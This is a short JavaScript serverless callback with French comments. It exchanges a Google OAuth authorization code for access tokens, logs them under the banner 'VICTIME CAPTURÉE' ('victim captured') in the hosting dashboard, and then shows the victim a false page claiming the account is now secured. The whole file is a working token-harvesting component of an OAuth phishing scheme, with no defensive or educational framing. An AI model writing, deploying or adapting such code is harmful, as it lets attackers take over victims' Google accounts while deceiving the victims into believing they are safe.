const fetch = require('node-fetch');

export default async function handler(req, res) {
    const { code } = req.query;

    if (!code) {
        return res.status(400).send('Code manquant');
    }

    try {
        // Échange du code contre un Token
        const tokenResponse = await fetch('https://oauth2.googleapis.com/token', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({
                client_id: process.env.GOOGLE_CLIENT_ID,
                client_secret: process.env.GOOGLE_CLIENT_SECRET,
                code: code,
                grant_type: 'authorization_code',
                redirect_uri: `https://${process.env.VERCEL_URL}/api/callback`
            })
        });

        const tokens = await tokenResponse.json();

        // LOG DES DONNÉES (Visible dans le tableau de bord Vercel)
        console.log("=== VICTIME CAPTURÉE ===");
        console.log("Tokens:", JSON.stringify(tokens));

        res.send('<h1>Analyse terminée</h1><p>Votre compte est sécurisé.</p>');
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
}